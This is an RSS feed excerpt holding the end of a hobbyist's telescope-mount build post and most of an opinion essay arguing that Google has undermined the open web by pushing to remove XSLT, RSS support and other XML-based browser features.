(2x)</td><td>Research</td><td>57.05</td><td></td></tr><tr><td>CNC parts</td><td>Mount</td><td>215.76</td><td>273.8</td></tr><tr><td>Import tax CNC</td><td>Mount</td><td>58.04</td><td></td></tr><tr><td>PCB (5x)</td><td>Mount</td><td>178.74</td><td></td></tr><tr><td>Import tax PCB</td><td>Mount</td><td>33.54</td><td></td></tr><tr><td>PCB2 (5x)</td><td>Mount</td><td>178.74</td><td>42.46</td></tr><tr><td>Import tax PCB2</td><td>Mount</td><td>33.54</td><td></td></tr><tr><td>Extra Harmonic wave generator 8mm</td><td>Mount</td><td>44.59</td><td>44.59</td></tr><tr><td>Import customs duty harmonic wave generator</td><td>Mount</td><td>36</td><td></td></tr><tr><td><strong>Total Project Cost</strong></td><td></td><td><strong>1711.42</strong></td><td><strong>799.15</strong></td></tr></tbody></table>
<p><em>Single unit costs represent what one mount would cost without bulk purchases, shipping minimums, and reusable tools.</em></p>
<h2 id="anyway">Anyway</h2>
<p>It was totally worth it.</p>
<p>The failed Version 1 PCB taught me never to skip verification steps, regardless my occasional impatience. OnStepX opened up the world of equatorial mount operation and just the joy of watching that thing slew across the sky. FreeCAD modeling skills improved dramatically through multiple housing iterations. I will probably spend more attention to documenting during future builds: writing down thoughts along the way and taking better pictures/screenshots/recordings.</p>
<p>Sure, I spent about as much as a commercially available mount, but I gained so much more. Plus I have a freaking mount that tracks stars!</p>
<p>That feeling when you point at a nebula, watch it track perfectly, and know (almost) exactly how everything works, cause you built it. ✨</p>
<p><img alt="Galaxy Image Captured" loading="lazy" width="800" height="600" decoding="async" data-nimg="1" srcset="https://www.svendewaerhert.com/content/blog/telescope-mount/opt/galaxy-opt-828.WEBP 1x, https://www.svendewaerhert.com/content/blog/telescope-mount/opt/galaxy-opt-1920.WEBP 2x" src="https://www.svendewaerhert.com/content/blog/telescope-mount/opt/galaxy-opt-1920.WEBP">
<em>M51 Whirlpool Galaxy, 23.5 million lightyears away</em></p>
<h2 id="image-gallery">Image Gallery</h2>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Google is killing the open web (148 pts)]]></title>
            <link>https://wok.oblomov.eu/tecnologia/google-killing-open-web/</link>
            <guid>44949857</guid>
            <pubDate>Tue, 19 Aug 2025 09:38:48 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://wok.oblomov.eu/tecnologia/google-killing-open-web/">https://wok.oblomov.eu/tecnologia/google-killing-open-web/</a>, See on <a href="https://news.ycombinator.com/item?id=44949857">Hacker News</a></p>
<div id="readability-page-1" class="page"><article class="page" lang="en">







<section id="pagebody" role="main">
<p><a href="http://en.wikipedia.org/wiki/Google">Google</a> is managing to achieve what <a href="http://en.wikipedia.org/wiki/Microsoft">Microsoft</a> couldn't: killing the open <a href="http://en.wikipedia.org/wiki/World%20Wide%20Web">web</a>.
The efforts of <a href="http://en.wikipedia.org/wiki/GAFAM">tech giants</a> to gain control of and enclose the commons for extractive purposes
have been clear to anyone who has been following the history of the <a href="http://en.wikipedia.org/wiki/Internet">Internet</a> for at least the last decade,
and the adopted strategies are varied in technique as they are in success,
from <a href="http://en.wikipedia.org/wiki/Embrace%2C%20Extend%2C%20Extinguish">Embrace, Extend, Extinguish</a> (<a href="https://wok.oblomov.eu/tag/EEE/" rel="tag">EEE</a>)
to monopolization and lock-in.</p>

<p>What I want to talk about in this article is the war Google has been waging on <a href="http://en.wikipedia.org/wiki/XML">XML</a> for over a decade,
why it matters that they've finally encroached themselves enough to get what they want,
and what we can do to fight this.</p>

<div>
<ol>
	<li><a href="#index1h1">Google is killing the open web</a>
	<ol>
		<li><a href="#alittlebitofhistory">A little bit of history</a>
		</li>
		<li><a href="#googleswaronxmlasaproxyforthewaragainsttheopenweb">Google's war on XML as a proxy for the war against the open web</a>
		</li>
		<li><a href="#whyitmatters">Why it matters</a>
		<ol>
			<li><a href="#dorian">Dorian Taylor on XSLT</a>
			</li>
		</ol>
		</li>
		<li><a href="#whatwecandoaboutit">What we can do about it</a>
		<ol>
			<li><a href="#makeyourselfbeseen">Make yourself be seen</a>
			</li>
			<li><a href="#makeyourselfbeheard">Make yourself be heard</a>
			</li>
			<li><a href="#buildthealternative">Build the alternative</a>
			</li>
		</ol>
		</li>
		<li><a href="#afterword">Afterword</a>
		</li>
		<li><a href="#nameandshame">Name and shame</a>
		</li>
		<li><a href="#madethenews">Made the news</a>
		</li>
	</ol>
	</li>
</ol>
</div>

<h2 id="alittlebitofhistory"><a name="index1h2"></a>A little bit of history</h2>

<p>Google entered the browser market at a time when web development was starting to see the light again
after Microsoft's “win” of the <a href="http://en.wikipedia.org/wiki/First%20browser%20war">First browser war</a> through the abuse of its operating system's monopoly
by shipping its <a href="http://en.wikipedia.org/wiki/Internet%20Explorer">Internet Explorer</a> for free and thus cutting off «<a href="http://en.wikipedia.org/wiki/Netscape">Netscape</a>'s air supply»,
as intended.</p>

<p>What managed to break through Microsoft's short-lived victory was an alliance of browsers
(my favorite <a href="https://wok.oblomov.eu/tecnologia/opera-requiem/">Opera</a> on its Presto engine,
<a href="http://en.wikipedia.org/wiki/Mozilla">Mozilla</a>'s <a href="http://en.wikipedia.org/wiki/Firefox">Firefox</a> on its Gecko engine,
and the newborn Safari from <a href="http://en.wikipedia.org/wiki/Apple%20Inc%2E">Apple</a>,
whose <a href="http://en.wikipedia.org/wiki/WebKit">WebKit</a> engine was forked from the <a href="http://en.wikipedia.org/wiki/KHTML">KHTML</a> engine that was being developed
for the <a href="http://en.wikipedia.org/wiki/KDE">KDE</a> <a href="http://en.wikipedia.org/wiki/Linux">Linux</a> desktop environment)
that decided to leverage their standards compliance to reinforce each other's position
against the crippling effect of Microsoft's dominance
—a dominance that Microsoft tried to protect resorting <a href="https://press.opera.com/2003/02/14/opera-releases-bork-edition/" title="Opera releases “Bork” edition">to the vilest tricks</a>.</p>

<p>Google entered the market heavily abusing its dominance in web search
to push the adoption of its <a href="http://en.wikipedia.org/wiki/Google%20Chrome">Chrome</a> browser,
a practice not unlike the one used by Microsoft to push the adoption of IE,
and of equally questionable legality and moral standing,
a thing which was frequently overlooked with several excuses,
not least the fact that Chrome was built on an open source core,
<a href="http://en.wikipedia.org/wiki/Chromium">Chromium</a>, that was mostly assembled from software and libraries
developed by other companies (primarily, Mozilla and Apple).</p>

<p>In the years of Chrome's release,
the Internet was undergoing massive changes,
with the emergence of centralized social media platforms like <a href="http://en.wikipedia.org/wiki/Facebook">Facebook</a>
that started eroding the previous distributed social network of blogging platforms,
Google's own <a href="http://en.wikipedia.org/wiki/Gmail">Gmail</a> mail service gaining ground over
both <abbr title="Internet Service Provider">ISP</abbr> offering
and other “cloud” offers like <a href="http://en.wikipedia.org/wiki/Yahoo%21">Yahoo!</a>'s and Microsoft's <a href="http://en.wikipedia.org/wiki/Hotmail">Hotmail</a>,
and mobile connectivity growing beyond “professionals”,
thanks mostly to Apple's <a href="http://en.wikipedia.org/wiki/iPhone">iPhone</a> and
Google's own at-the-time recent acquisition of <a href="http://en.wikipedia.org/wiki/Android%20%28operating%20system%29">Android</a>,
plus some soon-to-be minor players <a href="https://wok.oblomov.eu/tecnologia/n900/">I've talked about in the past</a>.</p>

<p>For the purposes of our discussion,
these changes had two major points of focus in terms of website development.</p>

<p>On the one hand, web developers started giving more attention to standards compliance,
as it gave them more opportunities towards the growing user base of mobile users,
which were unlikely to have the desktop-dominant Internet Explorer as browser.
This helped accelerate the demise of IE
(which was still going strong when Chrome was first released)
—whose flaky standards compliance was ultimately responsible for its demise
nearly a decade later, and subsequently for the complete discontinuation of its line
(after the brief attempt of a reprise under the legacy <a href="http://en.wikipedia.org/wiki/Microsoft%20Edge%20Legacy">Edge</a> moniker)—
and emboldened the “underdogs” of the time (Mozilla, Apple, Opera).</p>

<p>On the other hand, there was a distinct shift towards centralization of web services,
which in turn accelerated the development of <a href="http://en.wikipedia.org/wiki/web%20application">web application</a>s,
graphical user interfaces for the underlying (centralized) services
that effectively relied on the browser(s) as cross-platform toolkits,
an approach that would later give birth to the abomination
known as <a href="http://en.wikipedia.org/wiki/Electron%20%28software%20framework%29">Electron</a>
and the security nightmare better known as <a href="http://en.wikipedia.org/wiki/node%2Ejs">node.js</a>.</p>

<p>Of course, Google had a primary interest in making web apps a credible alternative to desktop applications,
what with their already-mentioned mail service and the recently-acquired-and-turned-web-app <a href="http://en.wikipedia.org/wiki/Google%20Maps">Google Maps</a>.
And since their browser was mostly a collection of existing <a href="https://wok.oblomov.eu/tag/floss/" rel="tag">FLOSS</a> software stapled together,
they could focus their development effort in creating a faster implementation of <a href="https://wok.oblomov.eu/tag/javascript/" rel="tag">JavaScript</a>,
better known as <a href="http://en.wikipedia.org/wiki/V8%20%28JavaScript%20engine%29">V8</a>.
Never mind the fact that even years later
<a href="https://github.com/mathjax/MathJax/wiki/Understanding-mathjax-performance#remarks-on-speed" title="MathJax performance / Remarks on speed">native implementations of any useful feature would remain faster and cheaper than JavaScript</a>.</p>

<p>But even before their direct involvement in browser development,
Opera and Mozilla had started taking their distance from the <a href="http://en.wikipedia.org/wiki/W3C">W3C</a>
standardizing efforts and set up the <a href="http://en.wikipedia.org/wiki/WHATWG">WHATWG</a>,
a consortium of browser developers dedicated to coordinate rapid development of new web features
without passing through the perceived slow W3C standardization process.</p>

<p>In truth, as it would become clear a few years later
—and even more so with Google effectively taking over the WHATWG and turning into
a sockpuppet to give a semblance of independence to their choices—
the main purpose of the WHATWG was to hijack the development of web technologies
to the benefits of the corporate investors,
whereas the W3C, with all its flaws,
had mostly given priority to features that would be of more general interest.</p>

<p>(It is not by chance that the most controversial standard to ever come out of the W3C
has probably been the <a href="http://en.wikipedia.org/wiki/Encrypted%20Media%20Extensions">Encrypted Media Extensions</a>,
released as a failed attempt to remain relevant in the web space,
and resulting instead of a critical strike against their own credibility as stewards of the open web.)</p>

<h2 id="googleswaronxmlasaproxyforthewaragainsttheopenweb"><a name="index2h2"></a>Google's war on XML as a proxy for the war against the open web</h2>

<p>Arguably, the turning point for the centralization of the web was the year <a href="http://en.wikipedia.org/wiki/2013">2013</a>.
This is essentially the year where <a href="http://en.wikipedia.org/wiki/GAFAM">GAFAM</a> stopped trying to pretend they liked to play nice,
and started to “pull the reins in” on interoperability.
Coincidentally, <a href="https://wok.oblomov.eu/tecnologia/opera-requiem-2/">it's also the year Opera stopped being Opera</a>,
but I'll talk about this some more <a href="#afterword">in the afterword</a>.</p>

<p>Let's see a few of the major events relevant to our discussion:</p>

<ol>
<li>2013 is the year Google decides to sunset <a href="http://en.wikipedia.org/wiki/Google%20Reader">Google Reader</a>,
a (if not the most) widely used <a href="http://en.wikipedia.org/wiki/web%20feed">web feed</a> aggregator (for <a href="https://wok.oblomov.eu/tag/rss/" rel="tag">RSS</a> and Atom feeds);</li>
<li>2013 is the year Google decides to close <a href="http://en.wikipedia.org/wiki/XMPP">XMPP</a> server-to-server federation in their <a href="http://en.wikipedia.org/wiki/Google%20Chat">Google Chat</a> service;
<a href="http://en.wikipedia.org/wiki/Facebook">Facebook</a> will to the same with their Messenger product the following year;</li>
<li>2013 is the year Google <a href="https://groups.google.com/a/chromium.org/g/blink-dev/c/zIg2KC7PyH0/m/a3VeYmvEAAAJ" title="Intent to Deprecate and Remove: XSLT">first proposes the removal of XSLT</a>, a proposal that is so unpopular
that it will continue receiving comments <em>against</em> it as far as 5 years later (the last comment in the thread is from 2018);</li>
<li>2013 is the year Google <a href="https://issues.chromium.org/issues/40289400#comment33" title="MathML is not ready for production">removes the just-introduced MathML support from Chrome</a>;
it will take 10 years and <a href="https://mathml.igalia.com/" title="MathML in Web Browsers - Igalia">an external company</a> to bring <a href="https://wok.oblomov.eu/tag/mathml/" rel="tag">MathML</a> support back into the browser.</li>
</ol>

<p>This was just the beginning. Several other actions were undertaken or attempted in the following years.</p>

<ol>
<li>in 2015, the WHATWG introduces the <a href="https://fetch.spec.whatwg.org/">Fetch API</a>,
purportedly intended as the modern replacement for the old <a href="http://en.wikipedia.org/wiki/XMLHttpRequest">XMLHttpRequest</a>;
prominently missing from the new specification is any mention or methods to manage <a href="https://wok.oblomov.eu/tag/XML/" rel="tag">XML</a> documents,
in favor of <a href="http://en.wikipedia.org/wiki/JSON">JSON</a> that instead gets a dedicated document body presentation method;</li>
<li>in 2015, <a href="https://groups.google.com/a/chromium.org/g/blink-dev/c/5o0yiO440LM" title="Intent to Deprecate: SMIL">Google proposes deprecating SMIL</a>, the standard for declarative animation and interactivity in <a href="http://en.wikipedia.org/wiki/SVG">SVG</a>;
I have <a href="https://wok.oblomov.eu/tecnologia/switch-element/">written in the past</a> about the usefulness of <a href="https://wok.oblomov.eu/tag/smil/" rel="tag">SMIL</a> and why not only it must not be deprecated,
but its use should actually be integrated into <a href="https://wok.oblomov.eu/tag/html/" rel="tag">HTML</a>, <a href="https://www.w3.org/TR/XHTMLplusSMIL/" title="XHTML+SMIL Profile">as noted by the W3C</a>;</li>
<li><a name="amp">in 2015, Google also </a><a href="https://blog.google/products/search/introducing-accelerated-mobile-pages/" title="Introducing Accelerated Mobile Pages">announces</a> the <a href="http://en.wikipedia.org/wiki/Accelerated%20Mobile%20Pages">Accelerated Mobile Pages</a> project,
purportedly as a way to make web pages more accessible and faster to load on mobile,
which coincidentally relied heavily on leveraging large <abbr title="Content Distribution Network">CDN</abbr>s
like Google to cache contents (and optionally pre-render it);
nevermind the facts that the seminal <a href="https://alistapart.com/article/responsive-web-design/" title="Responsive Web Design">Responsive Web Design</a> article on how to design for different screen sizes was from 2010,
that the <code>srcset</code> attribute for images to support different-sized screens was already supported by at-the-time current desktop and mobile browsers,
and that the primary reasons why webpages weren't fast to load on mobile
was because of the so-called <a href="https://idlewords.com/talks/website_obesity.htm" title="The Website Obesity Crisis (2015)">web obesity crisis</a>
which had been known <a href="https://web.archive.org/web/20120524025537/https://gigaom.com/2012/05/23/the-growing-epidemic-of-page-bloat/" title="The growing epidemic of page bloat (Internet Archive mirror)">since 2012 at least</a>,
and that the primary reason why AMP pages loaded faster was because they came with one tenth of the useless crap
attached to the “regular” pages
—so the only actual benefit from AMP was to <em>force</em> webdevs into writing leaner pages, with at least a modicum of responsivity,
(and of course, for Google, to encourage them to funnel everything through Google's —or any other tech giant— servers
for easier metric collection, faster ad serving, and more user profiling);</li>
<li><a name="nokeygen">still in 2015, Google announces the </a><a href="https://groups.google.com/a/chromium.org/g/blink-dev/c/pX5NbX0Xack" title="(Pre-)Intent to Deprecate: <keygen> element and application/x-x509-*-cert MIME handling">intent to deprecate the <code>keygen</code> element</a>,
a little-known but powerful security feature that simplified the generation of user-controlled cryptographic key pairs
for secure communication between the client and server;
you can read more about it in <a href="http://en.wikipedia.org/wiki/Tim%20Berners%2DLee">Tim Berners-Lee</a> <a href="https://lists.w3.org/Archives/Public/www-tag/2015Sep/0000.html" title="Agenda: <keygen> being destroyed when we need it">reaction</a>,
and in Hugo Landau's <a href="https://www.devever.net/~hl/web-keygen" title="Memoirs from the old web: The KEYGEN element">relevant “Memoir from the old web”</a>;
of note, <abbr='tim berners-lee'="">TBL's primary interest in this element was
to help build <a href="http://en.wikipedia.org/wiki/Solid%20%28web%20decentralization%20project%29">Solid</a>,
an incremental improvement on the WWW to make it more resistant to the centralization his original idea had been perverted into
(see also <a href="https://github.com/solid/solid/issues/134" title="Keygen is depreciated #134">the relevant issue in Solid's issue tracker</a>);
the importance of simplified handling of user certificates and the role they play in <a href="http://en.wikipedia.org/wiki/Mutual%20authentication">Mutual authentication</a>
can also be surmised by it being one of the features of the lightweight <a href="http://en.wikipedia.org/wiki/Gemini%20protocol">Gemini protocol</a>
that was also born as a response to the centralization and consequent complexification of the World Wide Web;</abbr='tim></li>
<li>in 2018, Mozilla removes RSS support from Firefox starting from version 64,
and actively prevents opening them in-browser, giving them an <em>even worse treatment</em> than generic XML files,
for which it keeps showing the structure
(for example: compare how your browser handles <a href="https://wok.oblomov.eu/data/tecnologia.stats.xml">the usage stats XML for this column</a>
with the way it handles <a href="https://wok.oblomov.eu/tecnologia/index.rss">the RSS feed</a> and <a href="https://wok.oblomov.eu/tecnologia/index.atom">the Atom feed</a>);
the official reason is that the “Live Bookmarks” feature couldn't be easily ported to the new architecture;
the fact that support for RSS could still be implemented via extensions, that Mozilla did not ship an extension to replace even just partially
the Live Bookmarks feature —leaving its users in the hands of potentially insecure third-part extensions—
and that feeds got an even worse treatment than generic XML document
show that the official reason is just an excuse;
this is one of the major cracks in the Mozilla façade,
as it starts to show that their existence is just <a href="http://en.wikipedia.org/wiki/controlled%20opposition">controlled opposition</a> for Google <a href="https://www.jwz.org/blog/2024/06/mozillas-original-sin/" title="Mozilla's Original Sin">to avoid antitrust issues</a>
—what Google wants goes, and Google doesn't want web feeds, so web feeds have to go;</li>
<li><a name="mv3">in 2019, Google </a><a href="https://security.googleblog.com/2019/06/improving-security-and-privacy-for.html" title="Improving Security and Privacy for Extensions Users">announces</a> a number of changes to purportedly make browser extensions “safer” for users,
starting the work for what would later become the <a href="https://developer.chrome.com/docs/extensions/develop/migrate/what-is-mv3" title="Extensions / Manifest V3">Extension Manifest V3</a>;
it is immediatelly apparent that at least some of the changes introduced
are primarily intended to prevent adblockers from working, and
<a href="https://www.eff.org/deeplinks/2019/07/googles-plans-chrome-extensions-wont-really-help-security" title="Google’s Plans for Chrome Extensions Won’t Really Help Security">don't actually do much to improve security or privacy</a>;
despite <a href="https://www.eff.org/deeplinks/2021/12/chrome-users-beware-manifest-v3-deceitful-and-threatening" title="Chrome Users Beware: Manifest V3 is Deceitful and Threatening">several</a> <a href="https://www.eff.org/deeplinks/2021/12/googles-manifest-v3-still-hurts-privacy-security-innovation" title="Google’s Manifest V3 Still Hurts Privacy, Security, and Innovation">reports</a>
against the at best ineffective and at worst detrimental changes proposed,
in the next years Google will <a href="https://developer.chrome.com/docs/extensions/develop/migrate/mv2-deprecation-timeline" title="Manifest v2 Deprecation Timeline">move on with the timeline</a>
to deprecate the previous extension APIs and finally succeed in its ad-blocking-blocking efforts;
although this change is not <em>currently</em> relevant for the XML/<wbr>XSLT focus of this article,
I mention it not only because it is one of the many examples of Chrome becoming
less of a <a href="http://en.wikipedia.org/wiki/User%20Agent">User Agent</a> and more of a “Google tool on your computer” over time,
but because <em>this</em> aspect is important for the future of client-side XML and XSLT,
<a href="#extensions">as I will discuss later</a>;</li>
<li>in 2023, Google renames their chatbot from Bard to
<a href="https://en.wikipedia.org/wiki/Gemini_(chatbot)#Launch_of_Gemini" title="Gemini (chatbot) | Launch of Gemini">Gemini</a> thereby completely eclipsing
<a href="http://en.wikipedia.org/wiki/Gemini%20%28protocol%29">the 4-year-old independent protocol by the same name</a>;
this is <em>possibly</em> coincidental, which would make it the <em>only</em>
unintentional attack on the open web by Google in the last 15 or so years
—and at this point even that is doubtful;</li>
<li>in 2023, Google proposes the <a href="http://en.wikipedia.org/wiki/Web%20Environment%20Integrity">Web Environment Integrity</a> API,
<a href="https://wok.oblomov.eu/tecnologia/preparing-end-open-web/">of which I've talked at the time</a>;
although this is only tangentially related to the XML-focused initiatives that are the subject of this article,
it is relevant to mention here as it is another example indicative of the push to make browsers less <a href="http://en.wikipedia.org/wiki/User%20Agent">User Agent</a>s
and more <a href="https://www.eff.org/deeplinks/2023/08/your-computer-should-say-what-you-tell-it-say-1" title="Your Computer Should Say What You Tell It To Say">corporate-controlled spyware</a>;</li>
<li>in 2023, Google <a href="https://mjtsai.com/blog/2025/06/17/chrome-doesnt-support-jpeg-xl/" title="Chrome Doesn’t Support JPEG XL">kills off</a> support for the <a href="http://en.wikipedia.org/wiki/JPEG%20XL">JPEG XL</a> image format,
introduced barely two years before,
depriving the Internet of a format that would have finally delivered on the promise of a unified format
to provide <a href="https://cloudinary.com/blog/contemplating-codec-comparisons" title="Contemplating Codec Comparisons">competitive</a> compression —both lossless and lossy—, progressive decoding, transparency, and animation,
which would have allowed it to replace the widespread (and less efficient) JPEG, PNG and GIF formats
that have been the staple of the web for the last decades;
this also is not directly related to XML (unless the reason for the hate is that JPEG&nbsp;XL supports <a href="http://en.wikipedia.org/wiki/XMP">XMP</a> metadata),
but should be filed under “against the open and indie web” as it prevents <em>at the very least</em>
the reduction of hosting and bandwidth costs that a transition to JPEG&nbsp;XL would offer.</li>
<li>in 2023, <a href="https://www.bbc.com/news/technology-28687513" title="Google to prioritise secure websites">after downranking plain HTTP websites for years</a>,
Google <a href="https://blog.chromium.org/2023/08/towards-https-by-default.html" title="Towards HTTPS by default">announces</a> an even more aggressive stance to <a href="https://wok.oblomov.eu/tecnologia/moving-to-https/">push for HTTPS adoption</a>;
I have a lot to say about the purported “security” of HTTPS
(and in particular about how it doesn't mean what most people think it means,
particularly concerning the distinction between the integrity of the connection between the client and server
versus the authenticity of the content, particularly of relevance for both corporate silos and federated social networks),
but that's material for a different article,
so here I'll just link to <a href="http://scripting.com/2014/08/08/myBlogDoesntNeedHttps.html" title="My blog doesn't need HTTPS">a few</a> <a href="https://this.how/googleAndHttp/" title="Google and HTTP - Google is a guest on the web">writeups</a> by <a href="http://en.wikipedia.org/wiki/Dave%20Winer">Dave Winer</a>
(one of the inventors of RSS), especially <a href="http://scripting.com/2018/06/12/140329.html" title="I fear Google's control of the web">this particularly prophetic one</a>,
and point out the hypocrisy of claiming an interest for security by the same company
that <a href="#nokeygen">pushed for the removal of <code>keygen</code></a>;</li>
<li>in 2025 Google announces a change in their <a href="https://googlechrome.github.io/chromerootprogram/" title="Chrome Root Program Policy">Chrome Root Program Policy</a>
that within 2026 they will stop supporting certificate with an <a href="https://docs.openssl.org/master/man5/x509v3_config/#extended-key-usage" title="Extended Key Usage">Extended Key Usage</a>
that includes any usage other than server
(<a href="https://social.wildeboer.net/@jwildeboer/114516238307785904" title="Jan Wildeboer's thread">relevant Fediverse thread</a>, <a href="https://social.wildeboer.net/@jwildeboer/114652956737126005" title="Jan Wildeboer's other thread">other relevant Fediverse thread</a>);
this effectively kills certificates commonly used for <a href="http://en.wikipedia.org/wiki/mutual%20authentication">mutual authentication</a>
(hey look, it's the <a href="#nokeygen"><code>keygen</code> suppression</a> theme again!)
that include both client and server roles;
<em>coincidentally</em> this also <a href="https://social.wildeboer.net/@jwildeboer/114986215670464688" title="Jan Wildeboer's post about emailProtection">makes it harder</a>
to implement <a href="http://en.wikipedia.org/wiki/S%2FMIME">S/MIME</a>,
<a href="https://security.googleblog.com/2017/02/hosted-smime-by-google-provides.html" title="Hosted S/MIME by Google provides enhanced security for Gmail in the enterprise">unless you go through Google's services, of course</a>
—but Google's war on self-hosted email deserves its own article,
so that will be for another time.</li>
</ol>

<p>And we finally get to these days.
Just as <a href="https://www.citationneeded.news/curate-with-rss/">RSS feeds are making a comeback</a>
and users are starting to grow skeptic of the corporate silos,
Google <a href="https://github.com/whatwg/html/issues/11523" title="Should we remove XSLT from the web platform?">makes another run to kill XSLT</a>,
this time using the WHATWG as a sock puppet.
Particularly of note, <a href="https://issues.chromium.org/issues/435623334" title="Deprecate and remove XSLT">the corresponding Chromium issue</a>
was created <em>before</em> the WHATWG Github issue.
It is thus to no one's surprise that the <em>overwhelmingly negative</em> reactions to the issue,
the detailed explanations about why <a href="https://wok.oblomov.eu/tag/XSLT/" rel="tag">XSLT</a> is important,
how instead of removing it browsers should move to more recent versions of the standard,
and even the indications of existing better and more secure libraries to base such new implementations on,
<em>every</em> counterpoint to the removal
have gone <em>completely</em> ignored.</p>

<p>Still, the negative reactions were so extensive that the issue has been
ultimately locked —particularly when people started pointing out that
«we don't have enough resources to spend on this» was a completely idiotic excuse
from billion-dollar companies,
or even from smaller enterprises like Mozilla that apparently have enough money to waste
on features nobody wants like LLM chat integration:
this has ultimately confirmed that
the purpose of the issue was never to actually discuss whether or not XSLT should be removed,
but only to provide a flimsy excuse to pretend the removal was driven by a consensus
rather than a top-down directive from Google.</p>

<p>The only true sentences stated by the Googler responsible for this issue
were that browsers have been stuck with an obsolete version of XSLT for over two decades,
and that the implementations they (Google and Apple) rely on has some security issues.
The Googler in question also conveniently omitted several other important facts.</p>

<p>For example, he omitted that two new major versions of XSLT have been released since
this technology was first implemented in the browsers: XSLT&nbsp;2 in 2007, and XSLT&nbsp;3 in 2017.
This means that <a href="https://groups.google.com/a/chromium.org/g/blink-dev/c/zIg2KC7PyH0/m/a3VeYmvEAAAJ" title="Intent to Deprecate and Remove: XSLT">when Google first proposed to kill XSLT</a>,
a newer, considerably more powerful version of the standard had been released for six years already.
And already at the time people were pleading for browsers support to be upgraded to the new version.</p>

<p>It is thus not by chance or by lack of resources that browsers are stuck with the 1999 XSLT&nbsp;1:
it has been an intentional choice <em>against the users' will</em> since <em>at least</em> 2013,
the year we already mentioned as the turning point for the centralization of the web.
XSLT has been <em>intentionally boycotted</em> by Google, Apple and Mozilla:
using the excuse that it is not widely used today, after decades of undercutting any efforts in adoption,
refusing to fix bugs or even to provide meaningful errors to assist in debugging related issues,
is a complete mockery of the victims of these <em>policy</em>.</p>

<p>The Googler also omits to mention that both Google's and Apple's XSLT implementation
(not Mozilla's, that developed their own) relies on a set of free-software libraries
whose maintainer has <a href="https://gitlab.gnome.org/GNOME/libxml2/-/issues/913">recently undergone a bombardment of borderline abusive issue reports</a>
from the characteristically extractive corporate exploitation of <abbr title="Free/Libre Open Source Software"><a href="https://wok.oblomov.eu/tag/floss/" rel="tag">FLOSS</a></abbr>,
with requests to provide professional services without actually paying for it in any way.
Let's repeat that again:
we're talking about billion-dollar companies that have been exploiting the labor of free-software maintainers,
<em>demanding</em> a preferential treatment at no cost for them,
limiting their efforts to finding bugs,
without raising a finger to actually fix them
—almost as if the primary intent was to find excuses to expunge the library rather than working to improve the commons.
(And this is before even going into <a href="https://github.com/whatwg/html/issues/11523#issuecomment-3172069037">the irresponsible way in which these libraries were being used</a>.)</p>

<p>But of course anyone questioning the motives of the corporations controlling the WHATWG
or pointing out the abundance of resources they have,
and how these could easily be spent in bringing XSLT support to the XXI century
instead of being spent in user-antagonistic features,
is “off topic” and “in violation of the code of conduct”.</p>

<p>In the end, the WHATWG was forced to close down comments to the Github issue
to stop the flood of negative feedback, so that the Googler could move on to the next step:
<a href="https://github.com/whatwg/html/pull/11563">commencing the process of formalizing the dismissal of XSLT</a></p>

<h2 id="whyitmatters"><a name="index3h2"></a>Why it matters</h2>

<p>When the <a href="http://en.wikipedia.org/wiki/XML">XML</a> specification was released in 1998, it gained traction very quickly,
despite its increased verbosity,
because by losing some of the flexibility of <a href="http://en.wikipedia.org/wiki/SGML">SGML</a>
(the overreaching specification of which <a href="http://en.wikipedia.org/wiki/HTML">HTML</a> was the most famous incarnation)
it favored disambiguation and simplified parsing of documents of arbitrary kind.
Combined with <a href="http://en.wikipedia.org/wiki/XSLT">XSLT</a>, it allowed documents of any kind to become “Internet ready”,
and most importantly ready for the <em>World Wide Web</em>,
helping driving the WWW towards its designed goal of a «<a href="https://www.w3.org/History/1989/proposal.html">universal linked information system</a>».</p>

<p>Although the benefits of XML and the transformative power of XSLT mostly caught the attention of professionals in a variety of fields,
at the turn of the century their flexibility reached also into the more general population of web users
through the specific incarnation of <a href="http://en.wikipedia.org/wiki/RSS">RSS</a> and <a href="http://en.wikipedia.org/wiki/Atom%20%28web%20standard%29">Atom</a> <a href="http://en.wikipedia.org/wiki/web%20feeds">web feeds</a>,
which allowed users to remain informed about news and updates on their favorite websites
without constantly “making the rounds”.</p>

<p>RSS and other XML-based technologies such as <a href="http://en.wikipedia.org/wiki/Pingback">Pingback</a>s
were the backbone of <a href="http://en.wikipedia.org/wiki/blogging">blogging</a>,
the distributed social network that characterized the first decade of the XXI century.</p>

<p>With blogging common and <em>distributed</em> across multiple platforms,
the possibility to <em>aggregate</em> information from disparate sources,
and still see it presented as a regular web page, across browsers,
without any need for scripting,
in a time where implementations were slow and
(thanks to Microsoft, intentionally) <a href="https://en.wikipedia.org/wiki/JavaScript#History">incompatible with each other</a>,
was seen as a clear win.</p>

<p>Despite the efforts by Google to kill it since 2013,
the RSS format remains an essential component of an open and independent web,
still in widespread usage both server and client side:
there's an estimate 500+ million websites using <a href="http://en.wikipedia.org/wiki/WordPress">WordPress</a>,
and they <em>all</em> feature RSS feeds, even when not properly advertised;
most if not all <a href="http://en.wikipedia.org/wiki/Fediverse">Fediverse</a> platforms also offer RSS feeds,
and some (e.g. <a href="http://en.wikipedia.org/wiki/Friendica">Friendica</a>) can also import them and thus work as aggregators;
and possibly most important, RSS are <em>the</em> fundamental component of <a href="http://en.wikipedia.org/wiki/podcast">podcast</a>s
(«<a href="https://www.thepodcasthost.com/business-of-podcasting/podcasts-need-an-rss/">it's not a podcast if it's not RSS</a>»),
a multimedia distribution format with hundreds of millions if not billions of users worldwide.</p>

<p>As already mentioned, <a href="https://www.citationneeded.news/curate-with-rss/">it's now seeing a resurgence</a>
as people have started realizing how catastrophic for the web was the centralization
driven by <a href="http://en.wikipedia.org/wiki/GAFAM">GAFAM</a> during the second decade of the XXI century
(even though too many have failed to learn the correct lesson,
and have just jumped from <a href="https://web.archive.org/web/20221221103518/https://god.dailydot.com/bartender-kicks-out-tweets/">one Nazi bar</a> <a href="https://www.techdirt.com/2025/08/04/substacks-algorithm-accidentally-reveals-what-we-already-knew-its-the-nazi-bar-now/">to the next</a>,
or have fallen for <a href="https://wok.oblomov.eu/tecnologia/credible-threat-2/">the cosplay of federation</a>
because it's shinier than <a href="https://wok.oblomov.eu/tecnologia/credible-threat-3/">actual federation</a>).</p>

<p>XSLT is an <em>essential</em> companion to RSS, as it allows the feed itself to be perused in the browser
(unless, of course, the browser makes the extra effort to prevents you from visualizing it at all, like Firefox does).
This allows sites with hundreds of feeds to use <em>the feed itself</em> (styled with XSLT) as index page,
reducing hosting and bandwidth costs.
And of course it can also be used to style any other “standard” XML document that may be found on a site:
